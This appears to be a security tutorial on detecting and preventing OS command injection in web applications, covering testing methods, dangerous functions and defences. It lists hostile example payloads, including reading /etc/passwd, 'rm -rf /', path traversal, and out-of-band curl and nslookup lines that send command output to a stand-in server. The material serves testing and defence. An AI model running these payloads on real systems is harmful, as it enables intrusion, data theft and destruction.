**OS command injection** is a technique used via a web interface in order to execute OS commands on a web server. The user supplies operating system commands through a web interface in order to execute OS commands. Any web interface that is not properly sanitized is subject to this exploit. With the ability to execute OS commands, the user can upload malicious programs or even obtain passwords. OS command injection is preventable when security is emphasized during the design and development of applications.

**OS Command Injection** happens when an application passes unsafe user-supplied data (e.g., input from a form, URL parameters, or cookies) to a system shell without proper validation or sanitization.

**How It Works:**

**User Input:** The application takes input from a user (e.g., via a web form or API request).

**Unsafe Execution:** The input is directly used in a system command without proper validation or escaping.

Command Execution: An attacker crafts malicious input to inject additional OS commands, which are executed by the server.

**1. Manual Testing**

Identify Input Points: Look for places in the application where user input is accepted (e.g., forms, URL parameters, cookies, headers).

Test with Malicious Input: Inject special characters and commands to see if the application executes them.

Common injection payloads:

**;**  (command separator in Unix-like systems)

**&**  (background execution in Unix-like systems)

**|**  (pipe operator)

**&&**  (conditional execution)

**$(...)  or  `...`**  (command substitution)

**||**  (OR operator)

**> or <**  (redirection operators)

Example payloads:

; ls  (list files)

; whoami  (check current user)

; cat /etc/passwd  (read sensitive file)

; rm -rf /  (delete files)

Observe Behavior: Check if the application executes the injected command or returns unexpected output.

**2. Automated Tools**

Use security scanning tools to automate the detection process. Some popular tools include:

Burp Suite: A web vulnerability scanner that can test for command injection.

OWASP ZAP: An open-source tool for finding vulnerabilities, including command injection.

Nikto: A web server scanner that can detect misconfigurations and vulnerabilities.

Nmap: Can be used to test for command injection in network services.

Acunetix: A commercial tool for detecting web vulnerabilities, including OS command injection.

**3. Code Review**

Look for Dangerous Functions: Identify functions that execute system commands and check if user input is passed to them without proper sanitization.

Examples of dangerous functions:

In PHP: system(), exec(), passthru(), shell_exec(), `...`

In Python: os.system(), subprocess.run(), subprocess.Popen()

In Java: Runtime.exec()

In Node.js: child_process.exec(), child_process.spawn()

Check for Input Sanitization: Ensure that user input is properly validated, sanitized, or escaped before being used in commands.

Use Safe Alternatives: Look for safer alternatives, such as parameterized APIs or libraries that avoid direct command execution.

**4. Fuzz Testing**

Use fuzzing tools to send random or malformed input to the application and observe its behavior.

Tools like wfuzz or ffuf can help automate this process.

**5. Monitor Server Logs**

Check server logs for unusual commands or errors that might indicate an attempted command injection.

Look for patterns like repeated use of special characters or unexpected commands.

**6. Test for Blind Command Injection**

Sometimes, the application does not return the output of the command directly. In such cases, use techniques like:

Time Delays: Inject commands like sleep 5 and observe if the application responds after a delay.

Out-of-Band (OOB) Techniques: Use tools like curl or wget to send requests to an external server controlled by you.

Example: ; curl http://your-server.com/$(whoami)

DNS Requests: Inject commands that trigger DNS lookups to your server.

Example: ; nslookup $(whoami).your-server.com

**7. Check for Context-Specific Vulnerabilities**

Some applications use user input in specific contexts (e.g., file paths, URLs). Test for vulnerabilities in these contexts:

Example: If the application uses user input in a file path, try injecting ../../etc/passwd to access sensitive files.

**8. Use Security Headers and WAFs**

Deploy a Web Application Firewall (WAF) to detect and block command injection attempts.

Use security headers like Content-Security-Policy to restrict the execution of unsafe scripts.

By combining these techniques, you can effectively detect and mitigate OS Command Injection vulnerabilities in your applications. Always follow secure coding practices and regularly test your applications for vulnerabilities.

Detecting **blind OS command injection** using time delays

You can use an injected command to trigger a time delay, enabling you to confirm that the command was executed based on the time that the application takes to respond. The ping command is a good way to do this, because lets you specify the number of ICMP packets to send. This enables you to control the time taken for the command to run:

**& ping -c 10 127.0.0.1 &**

This command causes the application to ping its loopback network adapter for 10 seconds.
